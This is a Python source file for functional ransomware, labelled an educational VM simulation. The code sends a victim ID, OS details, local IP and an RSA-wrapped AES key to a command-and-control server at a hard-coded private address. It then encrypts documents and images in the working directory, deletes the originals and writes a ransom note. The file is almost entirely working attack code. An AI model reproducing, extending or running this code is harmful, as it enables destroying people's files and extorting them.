import os
import base64
import requests
import socket
import getpass
import platform
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import uuid

# Public key will be inserted by payload_builder
PUBLIC_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyMI92lvJwNyQ+Vayc8i/
zK45hk0soe+eISgp05SO9J2P9cfX7Z6cezBXqpm4WAMhphrG54n99TVAQ9Bcuqm9
CDyesXXUwZczimbPeYIFy6DOatpib86mYIcL7D+sVMSt6d2QdOwdEAN0SS+HrGmO
zxepdUkd9NRB8aBDV5L9OAkqUrYyCu3XzXaiDAoV0hBt6EXi0iwyTIn3Q1rvra4s
UmHYghUPmouv17JfeZ8SrsP9bShCRn3PloIPC/kLTGnDrYNsIH2GnSVCC4ee/bUc
koCMoePEJJjKfa4EnM7cVesAKsaRMm//zxvfNP/qA419HNbzcSYfvG/tTH2P2Z0q
4wIDAQAB
-----END PUBLIC KEY-----'''

class SimpleRansomware:
    def __init__(self):
        self.c2_url = f"http://192.168.80.134:5000/register"
        self.victim_id = str(uuid.uuid4())[:8]
        self.aes_key = os.urandom(32)
        print(f"[DEBUG] Victim ID: {self.victim_id}")
        self.public_key = self.load_key()
        
    def load_key(self):
        print("[DEBUG] Attempting to load public key...")
        
        # Debug: Check key string
        print(f"[DEBUG] Key starts with: {PUBLIC_KEY[:30]}")
        print(f"[DEBUG] Key ends with: {PUBLIC_KEY[-30:]}")
        print(f"[DEBUG] Key contains 'BEGIN': {'BEGIN' in PUBLIC_KEY}")
        print(f"[DEBUG] Key contains 'END': {'END' in PUBLIC_KEY}")
        
        try:
            # Try loading with explicit encoding
            key_bytes = PUBLIC_KEY.encode('utf-8')
            print(f"[DEBUG] Key bytes length: {len(key_bytes)}")
            
            key = serialization.load_pem_public_key(
                key_bytes,
                backend=default_backend()
            )
            print("[DEBUG] Public key loaded successfully!")
            return key
            
        except Exception as e:
            print(f"[DEBUG] Error loading key: {type(e).__name__}: {e}")
            
            # Try alternative: remove any extra whitespace
            print("[DEBUG] Trying with stripped key...")
            cleaned_key = PUBLIC_KEY.strip()
            key_bytes = cleaned_key.encode('utf-8')
            
            try:
                key = serialization.load_pem_public_key(
                    key_bytes,
                    backend=default_backend()
                )
                print("[DEBUG] Success with stripped key!")
                return key
            except Exception as e2:
                print(f"[DEBUG] Still failed: {e2}")
                raise
    
    def register_with_c2(self):
        print("[DEBUG] Attempting to register with C2...")
        
        try:
            encrypted_key = self.public_key.encrypt(
                self.aes_key,
                padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), 
                            algorithm=hashes.SHA256(), label=None)
            )
            print("[DEBUG] AES key encrypted successfully")
            
            data = {
                'id': self.victim_id,
                'os': platform.platform(),
                'ip': socket.gethostbyname(socket.gethostname()),
                'files': 0,
                'key': base64.b64encode(encrypted_key).decode()
            }
            
            print(f"[DEBUG] Sending data to {self.c2_url}")
            response = requests.post(self.c2_url, json=data, timeout=5)
            print(f"[DEBUG] Response status: {response.status_code}")
            
            if response.status_code == 200:
                print(f"[+] Registered with C2: {self.victim_id}")
                return True
        except Exception as e:
            print(f"[-] C2 offline: {e}")
        
        return False
    
    def encrypt_test_files(self):
        """Encrypt files in current directory for demo"""
        print("[DEBUG] Starting file encryption...")
        
        test_files = []
        current_dir = os.getcwd()
        print(f"[DEBUG] Current directory: {current_dir}")
        print(f"[DEBUG] Files in directory: {os.listdir('.')}")
        
        # Look for .txt, .docx, .jpg files
        for f in os.listdir('.'):
            if f.endswith(('.txt', '.docx', '.jpg', '.png', '.pdf')) and not f.startswith('.'):
                test_files.append(f)
        
        if not test_files:
            print("[DEBUG] No test files found, creating new ones...")
            # Create test files
            for i in range(3):
                filename = f"test_document_{i}.txt"
                with open(filename, 'w') as f:
                    f.write(f"This is test document {i}\n")
                test_files.append(filename)
        
        print(f"[DEBUG] Found {len(test_files)} files to encrypt")
        
        # Encrypt files
        encrypted_count = 0
        for filename in test_files:
            try:
                print(f"[DEBUG] Encrypting {filename}...")
                with open(filename, 'rb') as f:
                    data = f.read()
                
                iv = os.urandom(16)
                cipher = Cipher(algorithms.AES(self.aes_key), modes.CFB(iv))
                encryptor = cipher.encryptor()
                encrypted = encryptor.update(data) + encryptor.finalize()
                
                with open(filename + '.locked', 'wb') as f:
                    f.write(iv + encrypted)
                
                os.remove(filename)
                print(f"[+] Encrypted: {filename}")
                encrypted_count += 1
                
            except Exception as e:
                print(f"[-] Failed: {filename} - {e}")
        
        return encrypted_count
    
    def create_ransom_note(self):
        note = f"""
        ⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️
        
        To recover your files, contact the attacker.
        
        Your Victim ID: {self.victim_id}
        
        Don't try to decrypt files yourself!
        """
        
        with open("READ_ME.txt", "w") as f:
            f.write(note)
        
        print("[+] Ransom note created: READ_ME.txt")
    
    def run(self):
        print("="*60)
        print("🔒 Starting ransomware simulation...")
        print("="*60)
        print(f"Victim ID: {self.victim_id}")
        
        # Register with C2
        print("\n[1/4] Contacting C2 server...")
        if not self.register_with_c2():
            print("[!] Warning: Could not contact C2 server")
        
        # Encrypt files
        print("\n[2/4] Encrypting files...")
        count = self.encrypt_test_files()
        print(f"   → Encrypted {count} files")
        
        # Create ransom note
        print("\n[3/4] Creating ransom note...")
        self.create_ransom_note()
        
        # Clean up key
        self.aes_key = b'0' * 32
        
        print("\n" + "="*50)
        print("✅ SIMULATION COMPLETE!")
        print(f"📋 Your Victim ID: {self.victim_id}")
        print("📝 Share this ID with attacker")
        print("="*50)
        
        input("\nPress Enter to exit...")

if __name__ == "__main__":
    # Add a safety check
    print("⚠️ WARNING: This is for EDUCATIONAL use in VM only!")
    confirm = input("Continue? (yes/no): ").strip().lower()
    
    if confirm == 'yes':
        try:
            ransomware = SimpleRansomware()
            ransomware.run()
        except Exception as e:
            print(f"\n❌ ERROR: {type(e).__name__}: {e}")
            print("\nTroubleshooting tips:")
            print("1. Check if cryptography module is installed: pip install cryptography")
            print("2. Verify public key is correctly formatted")
            print("3. Make sure you're in the right directory")
            input("\nPress Enter to exit...")
    else:
        print("Operation cancelled.")